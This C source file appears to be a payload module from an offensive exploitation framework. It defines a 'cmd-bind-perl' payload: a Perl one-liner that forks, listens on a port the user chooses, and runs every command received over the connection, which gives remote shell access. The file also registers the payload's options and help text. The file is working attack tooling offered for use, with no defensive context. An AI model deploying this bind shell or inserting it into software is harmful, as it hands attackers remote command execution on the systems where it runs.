
#include "../payloads.h"
#include "../exploits.h"
#include <stdlib.h>

// payload's content
unsigned char cmdBindPerlPayload[] = 
"perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,%s,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'";

void cmdBindPerlHelp()
{
    printf("listens for a connection & spawns shell via perl\n");
}

// payload's options
struct payloadParam cmdBindPerlOpts[MAX_NUM_OF_PARAMS] = {
    { "LPORT", REQUIRED, STRING, NOT_SET, NULL, NOT_SET }
    //TODO: INTERNAL param random file name
};

struct payload cmdBindPerl = {
    5,
    "cmd-bind-perl",
    cmdBindPerlPayload,
    238,
    cmdBindPerlOpts,
    1,
    NULL,
    cmdBindPerlHelp
};
